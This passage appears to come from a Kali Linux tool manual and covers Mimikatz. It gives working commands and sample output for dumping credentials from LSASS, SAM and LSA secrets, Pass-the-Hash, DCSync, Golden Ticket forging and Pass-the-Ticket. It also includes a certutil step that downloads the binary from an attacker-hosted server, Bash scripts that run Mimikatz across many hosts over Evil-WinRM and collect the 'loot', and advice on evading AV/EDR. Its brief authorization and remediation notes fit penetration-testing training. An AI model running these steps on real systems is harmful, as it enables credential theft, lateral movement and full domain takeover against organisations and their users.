- DPAPI master keys and protected secrets

Mimikatz is modular, organized into functional groups ("modules") such as `sekurlsa`, `lsadump`, `kerberos`, `crypto`, `vault`, and `ts` (Terminal Services). It requires local Administrator or SYSTEM privileges on the target host to access LSASS memory, and it is frequently flagged by antivirus and EDR products, making evasion (obfuscation, in-memory execution, or use of forks) a common companion topic.

In a Kali Linux context, Mimikatz is generally:
- Downloaded/staged onto Kali as a Windows PE binary
- Transferred to a compromised Windows host (via SMB, HTTP, Evil-WinRM, etc.)
- Executed on that Windows host, either interactively or via a remote shell
- Its output is then parsed and used for lateral movement or privilege escalation

#### 15.6.2 Installation

Mimikatz is not a native Linux tool, so "installation" on Kali means fetching the compiled Windows binaries so they can be staged to a target.

##### 15.6.2.1 Installing via apt (Kali repository)

Kali ships a package that provides the Mimikatz Windows binaries for convenient staging:

```bash
sudo apt update
sudo apt install mimikatz -y
```

After installation, the Windows executables are typically placed under:

```bash
/usr/share/windows-resources/mimikatz/
```

Verify the install:

```bash
ls -lh /usr/share/windows-resources/mimikatz/
```

Expected output (paths may vary slightly by version):

```
total 16K
drwxr-xr-x 2 root root 4.0K Jan 10 09:12 Win32
drwxr-xr-x 2 root root 4.0K Jan 10 09:12 x64
```

Inside `x64/` you will find `mimikatz.exe`, `mimidrv.sys`, and `mimilib.dll`.

##### 15.6.2.2 Installing from source (GitHub release)

If the apt package is outdated, pull the latest compiled release directly from the official repository:

```bash
cd /opt
git clone https://github.com/gentilkiwi/mimikatz.git
```

Or download a specific compiled release archive:

```bash
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimikatz.zip
unzip mimikatz.zip -d mimikatz
```

##### 15.6.2.3 Preparing a transfer server

Since Mimikatz must run on the Windows target, stage a quick HTTP server on Kali to deliver the binary:

```bash
cd /usr/share/windows-resources/mimikatz/x64
python3 -m http.server 8080
```

Then, from the compromised Windows host (e.g., via a shell), retrieve it:

```powershell
certutil.exe -urlcache -f http://<KALI_IP>:8080/mimikatz.exe C:\Windows\Temp\mimikatz.exe
```

#### 15.6.3 Syntax

Mimikatz is executed on the Windows target and uses a command interpreter with module-scoped commands. The general syntax pattern is:

```
mimikatz.exe [module::command] [arguments]
```

It can be run interactively (dropping into a `mimikatz #` prompt) or non-interactively by chaining commands with the `-c` style invocation used by post-exploitation frameworks (e.g., Metasploit's `load kiwi`, or PowerShell wrappers).

Interactive invocation:

```
C:\Windows\Temp> mimikatz.exe
```

This opens the interactive shell:

```
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 12:34:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ***/
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Commands within the shell follow `module::command` syntax, for example:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

#### 15.6.4 Command Line Options / Modules

Mimikatz is organized by module. The most commonly used modules and commands in an authorized engagement are:

##### 15.6.4.1 privilege module

- `privilege::debug` — requests SeDebugPrivilege, required before touching LSASS memory.

##### 15.6.4.2 sekurlsa module (LSASS memory credential extraction)

- `sekurlsa::logonpasswords` — dumps credentials of all logged-on users from LSASS memory.
- `sekurlsa::wdigest` — dumps WDigest cleartext credentials (if enabled).
- `sekurlsa::tickets` — lists Kerberos tickets currently in memory.
- `sekurlsa::pth` — performs a Pass-the-Hash attack (`/user`, `/domain`, `/ntlm`, `/run`).
- `sekurlsa::minidump` — loads a previously captured LSASS minidump file for offline parsing.

##### 15.6.4.3 lsadump module (SAM/registry/domain secrets)

- `lsadump::sam` — dumps local SAM database hashes (requires access to registry hives or live SAM).
- `lsadump::secrets` — dumps LSA secrets from the registry.
- `lsadump::cache` — dumps cached domain logon credentials (mscash).
- `lsadump::dcsync` — performs a DCSync attack, impersonating a Domain Controller to request password data for a given account (`/user:<target>`).

##### 15.6.4.4 kerberos module

- `kerberos::list` — lists Kerberos tickets for the current session.
- `kerberos::ptt` — Pass-the-Ticket, injects a `.kirbi` ticket file into the current session.
- `kerberos::golden` — forges a Golden Ticket (requires krbtgt hash, domain SID, domain name).
- `kerberos::purge` — clears all Kerberos tickets from the current session.

##### 15.6.4.5 crypto module

- `crypto::capi` — patches CryptoAPI to allow exporting non-exportable private keys.
- `crypto::certificates` — lists/exports certificates and private keys.

##### 15.6.4.6 token module

- `token::list` — lists available access tokens.
- `token::elevate` — impersonates a listed token (commonly SYSTEM).

##### 15.6.4.7 misc / event / process modules

- `misc::cmd` — restores `cmd.exe` if disabled by GPO.
- `event::drop` — attempts to blind Windows Event Logging.
- `process::list` — lists running processes with PIDs.

##### 15.6.4.8 general options

- `exit` — closes the Mimikatz session.
- `log <file>` — logs all console output to a file.

#### 15.6.5 Basic Usage

The most common baseline workflow: elevate privileges, then dump logon credentials.

```
C:\Windows\Temp> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
```

Expected (truncated) output:

```
Authentication Id : 0 ; 615431 (00000000:00096547)
Session           : Interactive from 1
User Name         : jsmith
Domain            : CORP
Logon Server      : DC01
Logon Time        : 7/19/2026 9:14:22 AM
SID               : S-1-5-21-3623811015-3361044348-30300820-1013

        msv :
         [00000003] Primary
         * Username : jsmith
         * Domain   : CORP
         * NTLM     : 8846f7eaee8fb117ad06bd6bb76e3fdd
         * SHA1     : b89eaac7e61417341b710b727768294d0e6a277
        kerberos :
         * Username : jsmith
         * Domain   : CORP.LOCAL
         * Password : (null)
```

#### 15.6.6 Practical Examples with Output

##### 15.6.6.1 Example 1 — Requesting debug privilege

```
mimikatz # privilege::debug
Privilege '20' OK
```

##### 15.6.6.2 Example 2 — Dumping all logon credentials

```
mimikatz # sekurlsa::logonpasswords
...
NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0
```

##### 15.6.6.3 Example 3 — Dumping WDigest cleartext passwords

```
mimikatz # sekurlsa::wdigest

Authentication Id : 0 ; 615431
User Name         : jsmith
Domain            : CORP
        wdigest :
         * Username : jsmith
         * Domain   : CORP
         * Password : Summer2026!
```

##### 15.6.6.4 Example 4 — Dumping the local SAM database

```
mimikatz # lsadump::sam
Domain : DESKTOP-01
SysKey : abcdef1234567890abcdef1234567890
Local SID : S-1-5-21-...

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

##### 15.6.6.5 Example 5 — Performing Pass-the-Hash

```
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:8846f7eaee8fb117ad06bd6bb76e3fdd /run:cmd.exe
user    : administrator
domain  : CORP
program : cmd.exe
NTLM    : 8846f7eaee8fb117ad06bd6bb76e3fdd
  |  PID  4108
  |  TID  3920
  |  LSA Process is now R/W
  |  LUID 0 ; 725882 (00000000:000b13ba)
  \_ msv1_0   - data copy @ 000001F4A3B2C0D0 : OK !
  \_ kerberos - data copy @ 000001F4A3B45E10 : OK !
```

##### 15.6.6.6 Example 6 — Listing Kerberos tickets

```
mimikatz # sekurlsa::tickets
[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 7/19/2026 9:14:22 AM ; 7/19/2026 7:14:22 PM ; 7/26/2026 9:14:22 AM
   Server Name       : krbtgt/CORP.LOCAL @ CORP.LOCAL
   Client Name       : jsmith @ CORP.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
```

##### 15.6.6.7 Example 7 — Executing a DCSync attack

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'krbtgt' will be the user account
Object RDN           : krbtgt
** SAM ACCOUNT **
SAM Username         : krbtgt
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

##### 15.6.6.8 Example 8 — Forging a Golden Ticket

```
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-3623811015-3361044348-30300820 /krbtgt:2892d26cdf84d7a70e2eb3b9f05c425e /ptt
User      : fakeadmin
Domain    : corp.local
SID       : S-1-5-21-3623811015-3361044348-30300820
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 2892d26cdf84d7a70e2eb3b9f05c425e - rc4_hmac_nt
Golden ticket for 'fakeadmin @ corp.local' successfully submitted for current session
```

##### 15.6.6.9 Example 9 — Pass-the-Ticket from a saved .kirbi file

```
mimikatz # kerberos::ptt C:\Temp\admin.kirbi
* File: 'admin.kirbi': OK
```

##### 15.6.6.10 Example 10 — Dumping cached domain credentials

```
mimikatz # lsadump::cache
Domain : CORP
SysKey : abcdef1234567890abcdef1234567890

0 - jsmith
    LM  : 
    NTLM: 5835048ce94ad0564e29a924a03510ef
```

##### 15.6.6.11 Example 11 — Logging Mimikatz output to a file

```
mimikatz # log C:\Temp\mimikatz_output.txt
Using 'C:\Temp\mimikatz_output.txt' for logfile : OK

mimikatz # sekurlsa::logonpasswords
```

##### 15.6.6.12 Example 12 — Exiting the session

```
mimikatz # exit
Bye!
```

#### 15.6.7 Common Use Cases

- **Post-exploitation credential harvesting** — after gaining local admin on a workstation, dump all cached logon credentials for lateral movement.
- **Privilege escalation** — using cached SYSTEM or Domain Admin credentials found in memory to escalate access.
- **Lateral movement** — using Pass-the-Hash or Pass-the-Ticket to authenticate to other hosts without knowing the plaintext password.
- **Domain persistence testing** — demonstrating impact of a Golden Ticket attack when the krbtgt hash is compromised, to justify a krbtgt password reset (twice) as a remediation.
- **Domain Controller compromise validation** — using DCSync to show that an attacker with replication rights can extract any account's hash without touching the DC's disk.
- **Credential exposure audits** — checking whether WDigest is enabled, exposing cleartext passwords in memory, and recommending it be disabled via GPO.

#### 15.6.8 Automation with Bash

While Mimikatz itself runs on Windows, Kali-side Bash scripting is used to automate staging, delivery, and log collection across many targets.

##### 15.6.8.1 Bash script to stage Mimikatz and serve it over HTTP

```bash
#!/bin/bash
# stage_mimikatz.sh - stage mimikatz for delivery
MIMI_DIR="/usr/share/windows-resources/mimikatz/x64"
PORT=8080

if [ ! -d "$MIMI_DIR" ]; then
    echo "[-] Mimikatz directory not found. Installing..."
    sudo apt install mimikatz -y
fi

cd "$MIMI_DIR" || exit 1
echo "[+] Serving mimikatz.exe on port $PORT"
python3 -m http.server "$PORT"
```

##### 15.6.8.2 Bash script to automate execution across multiple hosts via Evil-WinRM

```bash
#!/bin/bash
# run_mimikatz_multi.sh - run mimikatz commands over evil-winrm on a host list
TARGETS="targets.txt"
USER="administrator"
HASH="8846f7eaee8fb117ad06bd6bb76e3fdd"

while read -r ip; do
    echo "[*] Targeting $ip"
    evil-winrm -i "$ip" -u "$USER" -H "$HASH" \
      -s /opt/scripts/invoke-mimikatz.ps1 \
      -e /opt/scripts/ > "loot_${ip}.txt" 2>&1
    echo "[+] Output saved to loot_${ip}.txt"
done < "$TARGETS"
```

##### 15.6.8.3 Bash script to parse NTLM hashes out of collected logs

```bash
#!/bin/bash
# extract_hashes.sh - pull NTLM hashes from mimikatz output logs
grep -oE "NTLM\s*:\s*[a-f0-9]{32}" ./loot_*.txt | awk -F: '{print $2}' | tr -d ' ' | sort -u > all_ntlm_hashes.txt
echo "[+] Unique NTLM hashes saved to all_ntlm_hashes.txt"
wc -l all_ntlm_hashes.txt
```

#### 15.6.9 Tips and Best Practices

- Always confirm written authorization and scope before extracting or handling live credentials.
- Run `privilege::debug` before any `sekurlsa` command; without SeDebugPrivilege, LSASS access will fail.
- Prefer taking an LSASS memory dump (`procdump -ma lsass.exe`) and parsing it offline with `sekurlsa::minidump` to reduce time spent live in a monitored process.
- Expect AV/EDR detection; understand that evasion techniques (in-memory loading via reflective DLL, patchless AMSI bypass, forked/obfuscated builds) may be needed and should be authorized as part of the engagement's rules of engagement.
- Immediately treat recovered credentials (especially krbtgt and Domain Admin hashes) as extremely sensitive; store, transmit, and dispose of them per the engagement's data-handling policy.
- After a Golden Ticket demonstration, recommend resetting the krbtgt password twice (to invalidate both current and previous hash) as remediation guidance.
- Use `log` to keep an audit trail of every command executed, which is useful both for reporting and for chain-of-custody purposes.

#### 15.6.10 Troubleshooting

| Issue | Likely Cause | Resolution |
|---|---|---|
| `ERROR kuhl_m_sekurlsa_acquireLSA` | Not running as Administrator/SYSTEM | Re-launch elevated (`runas`, or via PsExec/Evil-WinRM as an admin account) |
| `privilege::debug` returns `ERROR kuhl_m_privilege_simple` | Token doesn't have SeDebugPrivilege available | Ensure the account used has local Administrator rights; UAC may need bypassing |
| Mimikatz binary deleted immediately after write | AV/EDR quarantined the file | Use an unmodified but currently undetected build, in-memory execution, or authorized AV exclusion for the test window |
| `sekurlsa::logonpasswords` shows no passwords, only NTLM | WDigest disabled (default on modern Windows) | This is expected; cleartext extraction depends on legacy settings — rely on hashes/tickets instead |
| `kerberos::golden` ticket rejected by DC | Wrong domain SID or krbtgt hash | Re-verify with `whoami /user` and confirm hash via `lsadump::dcsync` before forging |
